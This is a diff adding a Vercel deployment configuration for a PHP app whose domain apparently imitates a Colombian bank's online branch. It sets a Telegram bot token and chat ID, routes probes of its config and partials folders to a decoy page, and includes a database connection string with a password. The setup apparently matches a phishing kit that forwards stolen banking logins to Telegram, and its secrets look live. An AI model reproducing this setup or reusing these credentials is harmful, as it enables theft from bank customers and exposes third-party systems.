@@ -1,0 +1,21 @@
+{
+  "version": 2,
+  "builds": [
+    {
+      "src": "api/index.php",
+      "use": "vercel-php@0.9.0"
+    }
+  ],
+  "routes": [
+    { "src": "/partials/.*", "status": 403, "dest": "/decoy.php" },
+    { "src": "/config/.*",   "status": 403, "dest": "/decoy.php" },
+    { "src": "/(.*)", "dest": "/api/index.php" }
+  ],
+  "env": {
+    "BOT_TOKEN":    "8634923330:AAH31BhUWH8O2LuD9IQdwZyUTUyc0Ij-Hxo",
+    "CHAT_ID":      "-5180034812",
+    "BASE_URL":    "https://solucionesvirtualesbancol.vercel.app/updatetele.php",
+    "SECURITY_KEY": "secure_key_123",
+    "DATABASE_URL": "postgresql://neondb_owner:npg_iHg1Z9yDGOQw@ep-jolly-rice-aizz7hvg-pooler.c-4.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require"
+  }
+}
